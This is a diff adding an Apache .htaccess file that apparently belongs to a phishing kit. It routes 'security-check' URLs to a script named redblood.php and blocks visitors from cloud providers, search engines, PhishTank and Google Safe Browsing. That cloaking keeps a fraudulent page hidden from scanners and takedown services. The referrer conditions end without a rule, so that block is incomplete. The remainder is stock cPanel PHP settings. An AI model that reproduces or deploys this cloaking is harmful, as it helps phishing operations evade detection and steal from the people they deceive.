@@ -1,0 +1,65 @@
+RewriteEngine On
+Options -Indexes
+Options +FollowSymlinks
+RewriteCond %{REQUEST_FILENAME} !-f
+RewriteCond %{REQUEST_FILENAME} !-d
+RewriteRule ^security-check/(.*)$ redblood.php?z=$1 [L]
+DirectoryIndex redblood.php index.htm index.html index.php
+
+RewriteBase /  
+SetEnvIfNoCase User-Agent "^DigitalOcean, LLC" bad_user
+SetEnvIfNoCase User-Agent "^Amazon Technologies Inc." bad_user
+SetEnvIfNoCase User-Agent "^Amazon.com, Inc." bad_user
+SetEnvIfNoCase User-Agent "^Google LLC" bad_user
+SetEnvIfNoCase User-Agent "^FranTech Solutions" bad_user
+SetEnvIfNoCase User-Agent "^Tier.Net Technologies LLC" bad_user
+SetEnvIfNoCase User-Agent "^OVH SAS" bad_user
+Deny from env=bad_user
+
+RewriteCond %{HTTP_REFERER} google\.com [NC,OR]
+RewriteCond %{HTTP_REFERER} amazon\.com [NC,OR]
+RewriteCond %{HTTP_REFERER} digitalocean\.com [NC,OR]
+RewriteCond %{HTTP_REFERER} facebook\.com [NC,OR]
+RewriteCond %{HTTP_REFERER} yahoo\.com [NC,OR]
+RewriteCond %{HTTP_REFERER} bing\.com [NC,OR]
+RewriteCond %{HTTP_REFERER} msn\.com [NC,OR]
+RewriteCond %{HTTP_REFERER} aol\.com [NC,OR]
+RewriteCond %{HTTP_REFERER} hotbot\.com [NC,OR]
+RewriteCond %{HTTP_REFERER} phishtank\.com [NC,OR]
+RewriteCond %{HTTP_REFERER} infoseek\.co\.jp [NC,OR]
+RewriteCond %{HTTP_REFERER} ^http(s)?://(www\.)?http://safebrowsing-cache.google.com/.*$ [NC]
+
+<FilesMatch "\.(ini|htaccess|inc|info|install|make|module|profile|test|po|sh|.*sql|theme|tpl(\.php)?|xtmpl)(~|\.sw[op]|\.bak|\.orig|\.save)?$|^(\.(?!well-known).*|Entries.*|Repository|Root|Tag|Template|composer\.(json|lock)|package\.(json|lock)|web\.config)$|^#.*#$|\.php(~|\.sw[op]|\.bak|\.orig\.save)$">
+Order allow,deny
+Deny from all
+</FilesMatch>
+
+# BEGIN cPanel-generated php ini directives, do not edit
+# Manual editing of this file may result in unexpected behavior.
+# To make changes to this file, use the cPanel MultiPHP INI Editor (Home >> Software >> MultiPHP INI Editor)
+# For more information, read our documentation (https://go.cpanel.net/EA4ModifyINI)
+<IfModule php8_module>
+   php_flag display_errors On
+   php_value max_execution_time 30
+   php_value max_input_time 60
+   php_value max_input_vars 1000
+   php_value memory_limit 128M
+   php_value post_max_size 8M
+   php_value session.gc_maxlifetime 1440
+   php_value session.save_path "/var/cpanel/php/sessions/ea-php81"
+   php_value upload_max_filesize 2M
+   php_flag zlib.output_compression On
+</IfModule>
+<IfModule lsapi_module>
+   php_flag display_errors On
+   php_value max_execution_time 30
+   php_value max_input_time 60
+   php_value max_input_vars 1000
+   php_value memory_limit 128M
+   php_value post_max_size 8M
+   php_value session.gc_maxlifetime 1440
+   php_value session.save_path "/var/cpanel/php/sessions/ea-php81"
+   php_value upload_max_filesize 2M
+   php_flag zlib.output_compression On
+</IfModule>
+# END cPanel-generated php ini directives, do not edit
